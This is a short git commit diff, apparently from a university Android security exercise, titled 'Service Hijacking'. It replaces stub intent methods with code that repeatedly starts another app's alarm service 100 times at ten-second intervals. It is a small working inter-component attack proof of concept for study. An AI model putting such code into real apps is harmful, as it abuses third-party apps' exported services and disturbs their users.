7fdabd196bd53c591d4a9ddd5064ec465356d6eb
Uday Mittal <uday19@gmail.com>
2016-11-08 03:31:03 -0800

    Service Hijacking

--- src/edu/uci/seal/icc/HiddenBehavior.java
+++ src/edu/uci/seal/icc/HiddenBehavior.java
@@ -4,18 +4,18 @@ import android.content.Context;
 import android.content.Intent;
 
 public class HiddenBehavior {
-    public Intent getIntent(String componentType){
-    	Intent i = new Intent("edu.uci.seal.action.SEND_SMS");
-    	return i;
-    }
-    public void startComponentExplicit(Context context, String componentType, Intent intent){
-    	//you can use the Context to start a component with the given Intent 
-    	
-    }
-    public void startComponentImplicit(Context context, String componentType, String action){
-    	//you can use the Context to start a component with the given action
-    	//make sure to create an Intent from that action
-    	
+    public void startHijacking(Context context){
+    	Intent alarmIntent = new Intent();
+    	alarmIntent.setAction("trikita.talalarmo.action.START_ALARM");
+        alarmIntent.setPackage("trikita.talalarmo");
+        for(int i=0; i< 100; i++) {
+            context.startService(alarmIntent);
+            try {
+                Thread.sleep(10000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
     }
 
 }
